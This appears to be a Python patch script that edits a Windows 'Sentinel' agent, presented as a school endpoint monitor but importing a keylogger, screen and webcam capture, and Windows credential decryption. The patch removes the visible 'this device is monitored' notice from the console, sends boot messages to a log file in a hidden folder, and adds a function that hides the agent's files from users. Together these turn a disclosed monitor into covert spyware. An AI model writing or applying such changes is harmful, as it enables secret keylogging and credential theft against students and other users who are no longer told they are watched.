import re
import sys
from pathlib import Path

def process_file(filepath):
    content = Path(filepath).read_text(encoding="utf-8")
    
    # Task 1: Add Dependencies
    old_import = """try:
    from supabase import create_client, Client
    import win32crypt
    import cv2
    from PIL import ImageGrab
    from pynput import keyboard # WE NEED THIS BACK FOR THE KEYLOGGER
except ImportError:
    sys.exit("Install dependencies: pip install supabase psutil pillow pynput opencv-python pywin32")"""
    new_import = """try:
    from supabase import create_client, Client
    import win32crypt
    import cv2
    from PIL import ImageGrab
    from pynput import keyboard
    import structlog
except ImportError:
    sys.exit("Install dependencies: pip install supabase psutil pillow pynput opencv-python pywin32 structlog")"""
    if old_import in content:
        content = content.replace(old_import, new_import)
    else:
        print("Could not find old import block")

    # Task 2: Inject Logger
    logger_setup = """
# --- ENTERPRISE LOGGING ---
def setup_structlog():
    log_dir = os.path.join(os.environ.get('PROGRAMDATA', 'C:\\\\ProgramData'), 'Obylon', 'logs')
    os.makedirs(log_dir, exist_ok=True)
    log_path = os.path.join(log_dir, 'nexus_sentinel.log')
    
    try:
        import ctypes
        ctypes.windll.kernel32.SetFileAttributesW(log_dir, 2)
    except Exception:
        pass

    log_file = open(log_path, "a", encoding="utf-8")
    
    structlog.configure(
        processors=[
            structlog.processors.add_log_level,
            structlog.processors.TimeStamper(fmt="%Y-%m-%d %H:%M:%S", utc=False),
            structlog.processors.JSONRenderer(),
        ],
        logger_factory=structlog.WriteLoggerFactory(file=log_file),
        wrapper_class=structlog.make_filtering_bound_logger(0),
    )
    return structlog.get_logger("obylon_agent")

logger = setup_structlog()
"""
    if "def setup_structlog():" not in content:
        # insert after new_import
        content = content.replace(new_import, new_import + "\n" + logger_setup)

    # Task 3 & 4: Inject BuildInfo and Hardening Functions and update main()
    old_main_block = """def main() -> None:
    print("=" * 60)
    print("  NOTICE: This device is monitored by school IT policy.")
    print("  Keyboard/screen activity is logged on policy violations.")
    print("  Authorized use only. Contact IT for questions.")
    print("=" * 60)
    print("\\n" + "═" * 60)
    print(r"  ███╗   ██╗███████╗██╗  ██╗██╗   ██╗███████╗")
    print(r"  ████╗  ██║██╔════╝╚██╗██╔╝██║   ██║██╔════╝")
    print(r"  ██╔██╗ ██║█████╗   ╚███╔╝ ██║   ██║███████╗")
    print(r"  ██║╚██╗██║██╔══╝   ██╔██╗ ██║   ██║╚════██║")
    print(r"  ██║ ╚████║███████╗██╔╝ ██╗╚██████╔╝███████║")
    print(r"  ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝")
    print( "          S E N T I N E L   v 6 . 3 . 5  (LTS)")
    print("═" * 60)
    print(" [+] Architecture : School Endpoint Monitor (LTS)")
    print(" [+] Intelligence : Lev Engine Active")
    print(" [+] Enforcement  : Native Win32 Kernel Warden")
    print(" [+] Resilience   : Lazarus Watchdog Online")
    print(f" [+] Identity     : {WORKSTATION_NAME} | {HARDWARE_UUID}")
    print("═" * 60 + "\\n")"""

    new_main_block = """class BuildInfo:
    VERSION = "6.3.5-LTS"
    BUILD_DATE = "2026-06-01"
    COMMIT = "monolith-stable"

    @staticmethod
    def print_banner():
        logger.info(f"=== OBYLON SENTINEL v{BuildInfo.VERSION} (LTS) ===", component="boot")
        logger.info("Build Details", build_date=BuildInfo.BUILD_DATE, commit=BuildInfo.COMMIT, component="boot")
        logger.info("Deployment target: School-managed Windows workstations", component="boot")
        logger.info("All evidence only on confirmed policy violation. Authorized IT use only.", component="boot")

def harden_installation():
    \"\"\"Hide everything important from casual snooping.\"\"\"
    paths_to_hide = [
        VAULT_DB,
        CACHE_DIR,
        Path(os.environ.get('PROGRAMDATA', 'C:\\\\ProgramData')) / "Obylon",
        Path.home() / ".sentinel_alias",
        Path.home() / ".sentinel_id",
    ]
    for p in paths_to_hide:
        if p.exists():
            _hide_path(p)
    logger.info("Self-protection: critical paths hidden from explorer", component="startup")

def main() -> None:
    BuildInfo.print_banner()
    harden_installation()"""

    if "def harden_installation():" not in content:
        content = content.replace(old_main_block, new_main_block)


    Path(filepath).write_text(content, encoding="utf-8")

if __name__ == "__main__":
    process_file(r"C:\\Sentinel-Agent\\Lts\\v6.3.5\\sentinel_agent.py")
